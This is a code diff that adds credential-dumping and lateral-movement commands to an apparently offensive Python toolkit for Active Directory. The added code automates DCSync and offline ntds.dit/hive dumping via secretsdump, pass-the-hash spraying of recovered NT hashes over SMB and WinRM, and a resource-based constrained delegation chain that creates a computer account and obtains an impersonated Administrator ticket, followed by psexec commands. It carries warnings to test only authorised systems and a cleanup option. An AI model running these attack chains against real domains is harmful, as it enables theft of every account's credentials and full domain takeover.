@@ -11,11 +11,18 @@ TryHackMe, your own test domain).
     Running these techniques against systems you do not own or do not have
     explicit written permission to test is illegal in most jurisdictions.
 
-It leans on two well-known, freely available toolsets:
+It leans on well-known, freely available toolsets:
   * impacket   -> direct LDAP queries, Kerberoasting (GetUserSPNs),
-                  AS-REP roasting (GetNPUsers)
+                  AS-REP roasting (GetNPUsers), secrets dumping / DCSync
+                  (secretsdump), and the RBCD chain (addcomputer/rbcd/getST)
   * netexec    -> SMB-level checks: credential validation, shares, users,
-                  groups, password policy, RID brute forcing
+                  password policy, RID brute forcing, pass-the-hash spraying
+  * bloodyAD   -> DACL / writable-object reads, ADIDNS, gMSA passwords
+
+Beyond initial recon it also covers a few common post-foothold steps once
+credential material or write access is in hand: dumping hashes from looted
+registry hives / ntds.dit or via DCSync, validating which recovered hashes
+still authenticate, and a resource-based constrained delegation attack.
 
 Every subcommand feeds its results into a central Report. At the end of a run
 the toolkit prints a LinPEAS-style, colour-coded summary that highlights the
@@ -28,11 +35,13 @@ from __future__ import annotations
 
 import argparse
 import getpass
+import os
 import random
 import re
 import shutil
 import subprocess
 import sys
+import tempfile
 import time
 from dataclasses import dataclass, field
 from datetime import datetime
@@ -148,6 +157,9 @@ REFS = {
     "delegation": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
                   "unconstrained-delegation",
     "pth": "https://www.thehacker.recipes/ad/movement/ntlm/pth",
+    "secretsdump": "https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds",
+    "dcsync": "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",
+    "rbcd": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",
     # Known-vulnerability references
     "ms17-010": "https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010",
     "zerologon": "https://www.secura.com/blog/zero-logon",
@@ -1605,6 +1617,355 @@ def cmd_all(args: argparse.Namespace, creds: Creds) -> int:
 
 
 # --------------------------------------------------------------------------- #
+#  Credential dumping & movement (secretsdump / PtH spray / RBCD)              #
+# --------------------------------------------------------------------------- #
+# These steps assume a foothold is already in hand: readable registry hives or
+# a backup of ntds.dit (offline dump), a replication-capable principal (DCSync),
+# a set of recovered hashes to validate (PtH spray), or write access over a
+# computer object (RBCD). Everything here is for AUTHORISED testing only.
+
+# Matches a secretsdump "user:rid:lmhash:nthash:::" row.
+HASH_ROW = re.compile(
+    r"^(?P<user>[^:]+):(?P<rid>\d+):"
+    r"(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::"
+)
+
+
+def _impacket_principal(creds: Creds) -> str:
+    """Build the 'domain/user[:password]' identity impacket scripts expect."""
+    principal = creds.user_domain
+    if creds.password and not creds.nthash:
+        principal = f"{principal}:{creds.password}"
+    return principal
+
+
+def _impacket_hash_args(creds: Creds) -> list[str]:
+    """Return the -hashes argument (normalised to :NTHASH) if we have a hash."""
+    if creds.nthash:
+        return ["-hashes", creds.nthash if ":" in creds.nthash else f":{creds.nthash}"]
+    return []
+
+
+def parse_hashdump(output: str, label: str, ref: str) -> int:
+    """Pull 'user:rid:lm:nt:::' rows out of secretsdump output and report them."""
+    users: list[str] = []
+    machines: list[str] = []
+    for ln in _lines(output):
+        m = HASH_ROW.match(ln.strip())
+        if not m:
+            continue
+        name = m.group("user")
+        entry = f"{name}:{m.group('nt')}"
+        (machines if name.endswith("$") else users).append(entry)
+    if users:
+        REPORT.add_f(
+            "Credentials", Sev.CRITICAL, f"{len(users)} account hash(es) via {label}",
+            details=users[:30] + (["..."] if len(users) > 30 else []),
+            explanation="NT hashes usable for pass-the-hash or offline cracking. "
+                        "Passwords in a backup can be stale, so validate which still "
+                        "work with the 'pth-spray' command.",
+            ref=ref,
+        )
+    if machines:
+        REPORT.add_f(
+            "Credentials", Sev.INFO, f"{len(machines)} machine account hash(es) via {label}",
+            details=machines[:15] + (["..."] if len(machines) > 15 else []),
+            explanation="Computer accounts rotate their password automatically "
+                        "(~every 30 days), so a hash from a backup hive is often "
+                        "already stale. A current DC machine hash can DCSync.",
+            ref=ref,
+        )
+    return len(users) + len(machines)
+
+
+def cmd_secretsdump(args: argparse.Namespace, creds: Creds) -> int:
+    """Dump secrets offline (LOCAL, from hive/ntds files) or remotely (DCSync)."""
+    script = find_impacket_script("secretsdump.py")
+    if not script:
+        err("secretsdump.py (impacket) not found in PATH. Install: pip install impacket")
+        return 1
+
+    offline_files = [
+        ("-system", getattr(args, "system", "")),
+        ("-security", getattr(args, "security", "")),
+        ("-sam", getattr(args, "sam", "")),
+        ("-ntds", getattr(args, "ntds", "")),
+    ]
+    provided = {flag: path for flag, path in offline_files if path}
+
+    if provided:
+        section("Secrets dump (offline hives - LOCAL)")
+        missing = [p for p in provided.values() if not os.path.isfile(p)]
+        if missing:
+            err(f"Hive/NTDS file(s) not found: {', '.join(missing)}")
+            return 1
+        if ("-ntds" in provided or "-sam" in provided) and "-system" not in provided:
+            err("Decrypting an NTDS/SAM hive needs the SYSTEM hive too (--system).")
+            return 1
+        cmd = [script]
+        for flag, path in provided.items():
+            cmd += [flag, path]
+        cmd += ["LOCAL"]
+        ref, label = REFS["secretsdump"], "offline hive dump"
+    else:
+        section("Secrets dump (remote DCSync)")
+        if creds.is_anonymous:
+            err("Remote secrets dump needs valid credentials. For an offline dump, "
+                "pass hive files instead (--system/--security/--ntds).")
+            return 1
+        cmd = [script, f"{_impacket_principal(creds)}@{creds.dc_ip}"]
+        cmd += _impacket_hash_args(creds)
+        cmd += ["-dc-ip", creds.dc_ip]
+        only = getattr(args, "only_user", "")
+        if only:
+            cmd += ["-just-dc-user", only]
+        elif getattr(args, "just_dc", True):
+            cmd += ["-just-dc"]
+        if getattr(args, "use_vss", False):
+            cmd += ["-use-vss"]
+        ref, label = REFS["dcsync"], "DCSync"
+
+    if getattr(args, "output", ""):
+        cmd += ["-outputfile", args.output]
+
+    code, out = run(cmd, args.dry_run)
+    if args.dry_run:
+        return code
+    if any(x in out for x in ("STATUS_ACCESS_DENIED", "rpc_s_access_denied", "0xc0000022")):
+        warn("Access denied. A remote dump needs a replication-capable or admin "
+             "principal; otherwise dump ntds.dit offline (--ntds + --system).")
+    found = parse_hashdump(out, label, ref)
+    if found:
+        good(f"Recovered {found} account hash(es)."
+             + (f" Saved with prefix {args.output}." if getattr(args, "output", "") else ""))
+        info("Next: validate them with 'pth-spray', or PtH into a host "
+             "(evil-winrm / psexec.py / wmiexec.py).")
+    return code
+
+
+def _load_cred_pairs(args: argparse.Namespace) -> list[tuple[str, str]]:
+    """Collect (user, nthash) pairs from --combo and/or --userlist + --hashlist."""
+    pairs: list[tuple[str, str]] = []
+    combo = getattr(args, "combo", "")
+    if combo:
+        try:
+            with open(combo) as f:
+                for ln in f:
+                    ln = ln.strip()
+                    if not ln or ln.startswith("#"):
+                        continue
+                    m = HASH_ROW.match(ln)
+                    if m:
+                        pairs.append((m.group("user"), m.group("nt")))
+                    elif ":" in ln:
+                        user, nt = ln.rsplit(":", 1)
+                        nt = nt.strip()
+                        if re.fullmatch(r"[0-9a-fA-F]{32}", nt):
+                            pairs.append((user.strip(), nt))
+        except OSError as e:
+            err(f"Could not read --combo file: {e}")
+    ulist = getattr(args, "userlist", "")
+    hlist = getattr(args, "hashlist", "")
+    if ulist and hlist:
+        try:
+            with open(ulist) as fu:
+                users = [l.strip() for l in fu if l.strip()]
+            with open(hlist) as fh:
+                hashes = [l.strip().split(":")[-1] for l in fh if l.strip()]
+            if len(users) != len(hashes):
+                warn(f"--userlist has {len(users)} entries but --hashlist has "
+                     f"{len(hashes)}; pairing up to the shorter list.")
+            pairs += list(zip(users, hashes))
+        except OSError as e:
+            err(f"Could not read userlist/hashlist: {e}")
+    seen: set[tuple[str, str]] = set()
+    uniq: list[tuple[str, str]] = []
+    for p in pairs:
+        if p not in seen:
+            seen.add(p)
+            uniq.append(p)
+    return uniq
+
+
+def _parse_spray(output: str) -> tuple[list[str], list[str]]:
+    """Return (valid_logins, pwned_logins) parsed from netexec spray output."""
+    valid: list[str] = []
+    pwned: list[str] = []
+    for ln in _lines(output):
+        if "[+]" not in ln:
+            continue
+        frag = ln.split("[+]", 1)[1].strip()
+        valid.append(frag)
+        if "pwn3d" in ln.lower():
+            pwned.append(frag)
+    return valid, pwned
+
+
+def cmd_pthspray(args: argparse.Namespace, creds: Creds) -> int:
+    """Validate/spray recovered NT hashes (user<->hash paired) over SMB/WinRM."""
+    section("Pass-the-hash spray")
+    nxc = require_netexec()
+    if not nxc:
+        return 1
+
+    pairs = _load_cred_pairs(args)
+    if not pairs:
+        err("No user:hash pairs to spray. Provide --combo FILE (lines 'user:nthash' "
+            "or secretsdump 'user:rid:lm:nt:::'), or --userlist + --hashlist.")
+        return 1
+    info(f"Loaded {len(pairs)} user:hash pair(s).")
+
+    protocols = getattr(args, "protocols", None) or ["smb", "winrm"]
+
+    tmpdir = tempfile.mkdtemp(prefix="adtk_pth_")
+    ufile = os.path.join(tmpdir, "users.txt")
+    hfile = os.path.join(tmpdir, "hashes.txt")
+    try:
+        with open(ufile, "w") as fu, open(hfile, "w") as fh:
+            for user, nt in pairs:
+                fu.write(user + "\n")
+                fh.write(nt + "\n")
+
+        any_valid = False
+        for proto in protocols:
+            section(f"Spraying over {proto.upper()}")
+            # --no-bruteforce pairs user[i] with hash[i] line-by-line.
+            cmd = [nxc, proto, creds.dc_ip, "-u", ufile, "-H", hfile,
+                   "--no-bruteforce", "--continue-on-success"]
+            if creds.domain:
+                cmd += ["-d", creds.domain]
+            _, out = run(cmd, args.dry_run)
+            if args.dry_run:
+                continue
+            valid, pwned = _parse_spray(out)
+            if valid:
+                any_valid = True
+                REPORT.add_f(
+                    "Access", Sev.HIGH,
+                    f"{len(valid)} valid {proto.upper()} login(s) via pass-the-hash",
+                    details=valid,
+                    explanation="These hashes still authenticate. A '(Pwn3d!)' marker "
+                                "means admin / code execution on the host.",
+                    ref=REFS["pth"],
+                )
+            if pwned:
+                REPORT.add_f(
+                    "Access", Sev.CRITICAL,
+                    f"{len(pwned)} {proto.upper()} login(s) with admin (Pwn3d!)",
+                    details=pwned,
+                    explanation="Administrative access. WinRM shell: "
+                                "evil-winrm -i <dc> -u <user> -H <nthash>.",
+                    ref=REFS["pth"],
+                )
+        if not any_valid and not args.dry_run:
+            warn("No hashes validated. If these came from a backup, user passwords "
+                 "may have rotated since - try other accounts or re-dump live.")
+    finally:
+        for p in (ufile, hfile):
+            try:
+                os.remove(p)
+            except OSError:
+                pass
+        try:
+            os.rmdir(tmpdir)
+        except OSError:
+            pass
+    return 0
+
+
+def cmd_rbcd(args: argparse.Namespace, creds: Creds) -> int:
+    """Resource-based constrained delegation chain: addcomputer -> rbcd -> getST."""
+    section("Resource-Based Constrained Delegation (RBCD)")
+    if creds.is_anonymous:
+        err("RBCD needs an identity that can write to the target computer object "
+            "(-u with -p or -H).")
+        return 1
+    if not creds.domain:
+        err("RBCD needs a domain (-d / --domain).")
+        return 1
+    dc_host = getattr(args, "dc_host", "")
+    if not dc_host:
+        err("RBCD needs the target/DC FQDN via --dc-host (e.g. dc01.corp.local); "
+            "it is used for the Kerberos SPN and resolution.")
+        return 1
+
+    target = getattr(args, "target", "") or (dc_host.split(".")[0].upper() + "$")
+    comp = getattr(args, "computer_name", "ATTACK$") or "ATTACK$"
+    if not comp.endswith("$"):
+        comp += "$"
+    comp_pass = getattr(args, "computer_pass", "") or "Attack123!"
+    impersonate = getattr(args, "impersonate", "Administrator") or "Administrator"
+    spn = getattr(args, "spn", "") or f"cifs/{dc_host}"
+
+    addc = find_impacket_script("addcomputer.py")
+    rbcdsc = find_impacket_script("rbcd.py")
+    getst = find_impacket_script("getST.py")
+    missing = [n for n, s in (("addcomputer.py", addc), ("rbcd.py", rbcdsc),
+                              ("getST.py", getst)) if not s]
+    if missing:
+        err(f"Missing impacket script(s): {', '.join(missing)}. Install impacket.")
+        return 1
+
+    principal = _impacket_principal(creds)
+    hash_args = _impacket_hash_args(creds)
+
+    if getattr(args, "cleanup", False):
+        section("RBCD cleanup")
+        run([rbcdsc, "-delegate-to", target, "-action", "flush",
+             "-dc-ip", creds.dc_ip, principal] + hash_args, args.dry_run)
+        run([addc, "-computer-name", comp, "-delete",
+             "-dc-ip", creds.dc_ip, principal] + hash_args, args.dry_run)
+        good("Cleanup attempted: flushed the target's RBCD and deleted the computer.")
+        return 0
+
+    warn("RBCD modifies AD: it creates a computer account and edits the target's "
+         "msDS-AllowedToActOnBehalfOfOtherIdentity. Only run against systems you are "
+         "authorised to test. Re-run with --cleanup afterwards to undo it.")
+
+    section("1/3 Create a controlled computer account")
+    run([addc, "-computer-name", comp, "-computer-pass", comp_pass,
+         "-dc-ip", creds.dc_ip, principal] + hash_args, args.dry_run)
+
+    section("2/3 Write the RBCD on the target")
+    _, out = run([rbcdsc, "-delegate-to", target, "-delegate-from", comp,
+                  "-action", "write", "-dc-ip", creds.dc_ip, principal] + hash_args,
+                 args.dry_run)
+    if not args.dry_run and "successfully" not in out.lower() \
+            and any(x in out.lower() for x in ("error", "denied", "failed")):
+        warn("RBCD write may have failed (see above). Your identity needs write "
+             "rights (GenericAll / GenericWrite / WriteDACL) over the target "
+             "computer object.")
+
+    section("3/3 Request an impersonated service ticket")
+    st_principal = f"{creds.domain}/{comp}:{comp_pass}"
+    _, out = run([getst, "-spn", spn, "-impersonate", impersonate,
+                  "-dc-ip", creds.dc_ip, st_principal], args.dry_run)
+    if args.dry_run:
+        return 0
+
+    if "saving ticket" in out.lower() or ".ccache" in out.lower():
+        REPORT.add_f(
+            "Delegation", Sev.CRITICAL,
+            f"RBCD: obtained a '{impersonate}' service ticket for {spn}",
+            details=[f"Computer added : {comp} / {comp_pass}",
+                     f"SPN            : {spn}",
+                     f"Impersonated   : {impersonate}"],
+            explanation=f"Use it: export KRB5CCNAME={impersonate}.ccache ; "
+                        f"psexec.py -k -no-pass {dc_host}. Kerberos needs the DC FQDN "
+                        "in /etc/hosts and a clock synced to the DC.",
+            ref=REFS["rbcd"],
+        )
+        good(f"Ticket obtained. Run: export KRB5CCNAME={impersonate}.ccache && "
+             f"psexec.py -k -no-pass {dc_host}")
+        info("When finished, re-run this command with --cleanup to remove the "
+             "computer account and flush the RBCD.")
+    else:
+        warn("No ticket produced. Usual causes: RBCD write failed, clock skew (sync "
+             "with the DC), or the DC FQDN not resolving (add it to /etc/hosts).")
+    return 0
+
+
+# --------------------------------------------------------------------------- #
 #  Argument parsing                                                            #
 # --------------------------------------------------------------------------- #
 def add_common_auth(parser: argparse.ArgumentParser) -> None:
@@ -1663,6 +2024,17 @@ examples:
 
   # Full initial recon pass with a LinPEAS-style report at the end
   ADEnumToolkit.py all -t 10.10.10.10 -d corp.local -u jdoe -p pass
+
+  # Dump hashes offline from looted hives, or remotely via DCSync
+  ADEnumToolkit.py secretsdump -t 10.10.10.10 --system SYSTEM --ntds ntds.dit
+  ADEnumToolkit.py secretsdump -t 10.10.10.10 -d corp.local -u admin -H :<nthash>
+
+  # Check which recovered hashes still authenticate (SMB + WinRM)
+  ADEnumToolkit.py pth-spray -t 10.10.10.10 -d corp.local --combo ntds.dump
+
+  # Resource-based constrained delegation to impersonate Administrator
+  ADEnumToolkit.py rbcd -t 10.10.10.10 -d corp.local -u lowpriv -H :<nthash> \\
+      --dc-host dc01.corp.local
 """,
     )
     sub = parser.add_subparsers(dest="command", required=True, metavar="<command>")
@@ -1678,6 +2050,11 @@ examples:
         ("kerberoast", "Request TGS hashes for SPN accounts (impacket)", cmd_kerberoast),
         ("asreproast", "Request AS-REP hashes for no-preauth accounts (impacket)", cmd_asreproast),
         ("vulns", "Enumerate known SMB/LDAP vulnerabilities (detection only)", cmd_vulns),
+        ("secretsdump", "Dump secrets: offline hives (LOCAL) or remote DCSync (impacket)",
+         cmd_secretsdump),
+        ("pth-spray", "Validate/spray recovered NT hashes over SMB/WinRM (netexec)",
+         cmd_pthspray),
+        ("rbcd", "Resource-based constrained delegation attack chain (impacket)", cmd_rbcd),
         ("writable", "List objects writable by the current principal (bloodyAD)", cmd_writable),
         ("dns", "Dump AD-integrated DNS records (bloodyAD)", cmd_dns),
         ("gmsa", "Enumerate gMSA accounts and read managed passwords (bloodyAD)", cmd_gmsa),
@@ -1727,6 +2104,51 @@ examples:
                                           help="Username list for unauthenticated AS-REP roasting")
     subparsers["asreproast"].add_argument("--format", choices=["hashcat", "john"],
                                           default="hashcat", help="Hash format (default: hashcat)")
+
+    # secretsdump: offline hive dump (LOCAL) or remote DCSync.
+    sd = subparsers["secretsdump"]
+    sd.add_argument("--system", default="", help="Path to a SYSTEM hive (offline dump)")
+    sd.add_argument("--security", default="", help="Path to a SECURITY hive (offline dump)")
+    sd.add_argument("--sam", default="", help="Path to a SAM hive (offline dump)")
+    sd.add_argument("--ntds", default="",
+                    help="Path to an ntds.dit database (offline dump; needs --system)")
+    sd.add_argument("--only-user", default="",
+                    help="Remote DCSync: dump only this account (-just-dc-user)")
+    sd.add_argument("--full", dest="just_dc", action="store_false",
+                    help="Remote: also dump SAM+LSA, not just the domain (omit -just-dc)")
+    sd.add_argument("--use-vss", action="store_true",
+                    help="Remote: use the VSS method instead of DRSUAPI")
+    sd.add_argument("-o", "--output", default="",
+                    help="Save recovered secrets to files with this prefix")
+
+    # pth-spray: validate recovered hashes.
+    ps = subparsers["pth-spray"]
+    ps.add_argument("--combo", default="",
+                    help="File of 'user:nthash' or secretsdump 'user:rid:lm:nt:::' lines")
+    ps.add_argument("--userlist", default="",
+                    help="Username list (paired line-by-line with --hashlist)")
+    ps.add_argument("--hashlist", default="",
+                    help="NT hash list (paired line-by-line with --userlist)")
+    ps.add_argument("--protocols", nargs="+",
+                    choices=["smb", "winrm", "ldap", "mssql", "rdp", "wmi"],
+                    help="Protocols to spray over (default: smb winrm)")
+
+    # rbcd: resource-based constrained delegation chain.
+    rb = subparsers["rbcd"]
+    rb.add_argument("--dc-host", default="",
+                    help="Target/DC FQDN for the Kerberos SPN, e.g. dc01.corp.local")
+    rb.add_argument("--target", default="",
+                    help="Victim computer account (default: derived from --dc-host, e.g. DC01$)")
+    rb.add_argument("--computer-name", default="ATTACK$",
+                    help="Name of the computer account to create (default: ATTACK$)")
+    rb.add_argument("--computer-pass", default="Attack123!",
+                    help="Password for the created computer account")
+    rb.add_argument("--impersonate", default="Administrator",
+                    help="User to impersonate in the service ticket (default: Administrator)")
+    rb.add_argument("--spn", default="",
+                    help="Service SPN for getST (default: cifs/<dc-host>)")
+    rb.add_argument("--cleanup", action="store_true",
+                    help="Undo: flush the target's RBCD and delete the created computer")
     return parser
 
 
